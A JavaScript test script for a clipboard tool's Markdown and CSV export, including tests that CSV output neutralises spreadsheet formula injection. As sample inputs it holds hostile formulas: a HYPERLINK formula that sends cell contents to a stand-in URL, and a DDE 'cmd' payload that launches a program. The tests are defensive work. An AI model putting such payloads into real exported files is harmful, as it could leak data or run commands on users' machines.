import { build } from 'esbuild';
const result = await build({
  entryPoints: ['src/lib/export.ts'],
  bundle: true,
  format: 'esm',
  target: 'es2022',
  platform: 'browser',
  write: false,
});
const code = new TextDecoder().decode(result.outputFiles[0].contents);
const url = 'data:text/javascript;base64,' + Buffer.from(code).toString('base64');
const { toMarkdown, toCsv } = await import(url);

const clips = [
  { id: 'a1', kind: 'text', content: 'Hello, "world"\nLine 2', preview: 'Hello, "world"…', source: { url: 'https://github.com/foo/bar', title: 'GitHub' }, pinned: true, createdAt: 1700000000000, lastSeenAt: 1700000000000, hitCount: 3, tags: ['code','github.com'], bytes: 22, hash: 'h1' },
  { id: 'b2', kind: 'image', content: 'data:image/png;base64,abc', mime: 'image/png', preview: 'Image: cat.png', source: { url: 'https://example.com', title: 'Ex' }, pinned: false, createdAt: 1700000001000, lastSeenAt: 1700000001000, hitCount: 1, tags: ['image'], bytes: 1000, hash: 'h2', ocrText: 'meow' },
  { id: 'c3', kind: 'link', content: 'https://example.org', source: {}, pinned: false, createdAt: 1700000002000, lastSeenAt: 1700000002000, hitCount: 1, tags: [], bytes: 19, hash: 'h3' },
];

let fails = 0;
function ok(name, cond, extra = '') {
  if (cond) console.log(`  ✓ ${name}`);
  else { fails++; console.log(`  ✗ ${name}${extra ? ' — ' + extra : ''}`); }
}

const md = toMarkdown(clips);
ok('markdown mentions every clip source', md.includes('github.com/foo/bar') && md.includes('example.org'));

const csv = toCsv(clips);
const lines = csv.split('\n');
ok('csv header first', lines[0].startsWith('id,kind,preview,content,'));
ok('csv quotes + doubles embedded quotes', csv.includes('"Hello, ""world""\nLine 2"'));
ok('csv omits image data URL', !csv.includes('data:image/png;base64') && csv.includes('data URL omitted'));
ok('csv joins tags with pipe', csv.includes('code|github.com'));

// CSV injection (CWE-1236): page-derived text must not become a live formula.
const evil = (content, extra = {}) => ({
  id: 'x', kind: 'text', content, source: {}, pinned: false, createdAt: 0, lastSeenAt: 0,
  hitCount: 1, tags: [], bytes: 1, hash: 'h', ...extra,
});
const row = (c) => toCsv([c]).split('\n')[1];
ok('= formula neutralised', row(evil('=1+1')).includes(",'=1+1,"), row(evil('=1+1')));
ok('+ formula neutralised', row(evil('+cmd')).includes(",'+cmd,"));
ok('- formula neutralised', row(evil('-2+3')).includes(",'-2+3,"));
ok('@ formula neutralised', row(evil('@SUM(A1)')).includes(",'@SUM(A1),"));
ok('quoted HYPERLINK payload neutralised + still quoted',
  row(evil('=HYPERLINK("http://e/?"&A1,"x")')).includes(`"'=HYPERLINK(""http://e/?""&A1,""x"")"`));
ok('page title formula neutralised',
  row(evil('ok', { source: { title: "=cmd|' /C calc'!A0" } })).includes("'=cmd|"));
ok('plain text untouched', row(evil('hello')).includes(',hello,'));
ok('mid-string = untouched', row(evil('a=b')).includes(',a=b,'));
ok('numeric columns not prefixed', /,1,1,/.test(row(evil('x'))));

if (fails) { console.log(`\n${fails} export test(s) failed`); process.exit(1); }
console.log('\nAll export tests passed.');
